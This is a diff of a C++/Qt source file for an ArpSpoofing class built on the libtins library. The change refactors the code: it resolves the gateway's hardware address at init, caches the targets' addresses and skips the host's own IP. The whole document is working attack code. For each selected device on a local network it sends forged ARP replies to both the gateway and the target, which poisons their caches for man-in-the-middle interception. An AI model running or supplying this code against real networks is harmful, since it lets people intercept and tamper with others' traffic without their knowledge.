@@ -3,78 +3,69 @@
 #include <QThread>
 #include <QEventLoop>
 
+using namespace Tins;
+
 ArpSpoofing::ArpSpoofing(QObject *parent) : QObject(parent)
 {
+}
 
+void ArpSpoofing::init(const NetworkInterface &interface)
+{
+    m_interface = interface;
+
+    IPv4Address gateway;
+    Tins::Utils::gateway_from_ip(m_interface.ipv4_address(), m_gatewayIp);
+
+    m_gatewayHw = Utils::resolve_hwaddr(m_interface, m_gatewayIp, m_sender);
 }
 
 void ArpSpoofing::doSpoofing()
 {
-    using namespace Tins;
+    if(!m_interface)
+    {
+        qCritical() << "ArpSpoofing has been not initialized !";
+        return;
+    }
 
     NetworkInterface::Info nifinfo = m_interface.info();
-
-    PacketSender sender;
-
-    EthernetII::address_type gateway_hw = Utils::resolve_hwaddr(m_interface, m_gatewayIp, sender);
 
     // Foreach device on network
     foreach(IPv4Address target_ip, m_iplist.keys())
     {
-        EthernetII::address_type target_hw = Utils::resolve_hwaddr(m_interface, target_ip, sender);
+        // Skip ourselves
+        if(nifinfo.ip_addr == target_ip)
+            continue;
+
+        EthernetII::address_type target_hw = m_iphw[target_ip];
 
         // Gateway ---------------------------------------------------------
 
-        // Logicial layer
-        ARP gw_arp(m_gatewayIp, target_ip, gateway_hw, nifinfo.hw_addr);
-        gw_arp.opcode(ARP::REPLY);
-
-        // Physical layer
-        EthernetII to_gw = EthernetII(gateway_hw, nifinfo.hw_addr) / gw_arp;
-
-        sender.send(to_gw, m_interface);
+        EthernetII arp_reply_to_gw = ARP::make_arp_reply(m_gatewayIp, target_ip, m_gatewayHw, nifinfo.hw_addr);
+        m_sender.send(arp_reply_to_gw, m_interface);
 
         // Target ---------------------------------------------------------
 
-        // Logicial layer
-        ARP tg_arp(target_ip, m_gatewayIp, target_hw, nifinfo.hw_addr);
-        tg_arp.opcode(ARP::REPLY);
+        EthernetII arp_reply_to_tr = ARP::make_arp_reply(target_ip, m_gatewayIp, target_hw, nifinfo.hw_addr);
+        m_sender.send(arp_reply_to_tr, m_interface);
 
-        // Physical layer
-        EthernetII to_tg = EthernetII(target_hw, nifinfo.hw_addr) / tg_arp;
+        qDebug() << "SPOOF"
+                 << target_ip.to_string().data()
+                 << m_gatewayIp.to_string().data()
+                 << target_hw.to_string().data()
+                 << nifinfo.hw_addr.to_string().data()
+                    ;
 
-        sender.send(to_tg, m_interface);
-
-        qDebug() << "SPOOF" << target_ip.to_string().data() << m_gatewayIp.to_string().data();
+//        qDebug() << "SPOOF" << arp_reply_to_tr.rfind_pdu<ARP>().sender_ip_addr().to_string().data();
     }
 }
 
 void ArpSpoofing::enableIp(Tins::IPv4Address ip, bool enabled)
 {
   m_iplist[ip] = enabled;
+  m_iphw[ip] = Utils::resolve_hwaddr(m_interface, ip, m_sender);
 }
 
 void ArpSpoofing::enableIp(QString ip, bool enabled)
 {
   enableIp(Tins::IPv4Address(ip.toLocal8Bit().data()), enabled);
-}
-
-Tins::IPv4Address ArpSpoofing::gatewayIp() const
-{
-  return m_gatewayIp;
-}
-
-void ArpSpoofing::setGatewayIp(const Tins::IPv4Address &gateway_ip)
-{
-  m_gatewayIp = gateway_ip;
-}
-
-Tins::NetworkInterface ArpSpoofing::interface() const
-{
-    return m_interface;
-}
-
-void ArpSpoofing::setInterface(const Tins::NetworkInterface &interface)
-{
-    m_interface = interface;
 }
